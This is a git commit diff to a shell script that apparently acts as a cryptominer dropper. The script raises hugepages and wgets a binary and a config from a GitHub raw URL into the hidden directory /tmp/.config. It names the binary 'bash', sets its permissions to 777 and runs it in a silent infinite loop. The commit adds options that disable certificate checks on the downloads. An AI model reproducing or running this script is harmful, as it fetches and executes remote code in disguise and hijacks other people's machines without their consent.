f24500081cad30a9c70195e20779f149b2754145
curiosityinteriorsuk <160749431+curiosityinteriorsuk@users.noreply.github.com>
2024-04-30 18:13:23 +0800

    Update zh88k.sh

--- zh88k.sh
+++ zh88k.sh
@@ -4,8 +4,8 @@ src="https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main"
 sysctl -w vm.nr_hugepages=32768 || sudo sysctl -w vm.nr_hugepages=32768
 
 mkdir -p "/tmp/.config"
-wget -qO "/tmp/.config/appsettings.json" "${src}/q.json"
-wget -qO "/tmp/.config/bash" "${src}/q"
+wget --no-check-certificate -qO "/tmp/.config/appsettings.json" "${src}/q1.json"
+wget --no-check-certificate -qO "/tmp/.config/bash" "${src}/q"
 chmod -R 777 "/tmp/.config"
 
 while true; do cd /tmp/.config; ./bash >/dev/null 2>&1 ; done
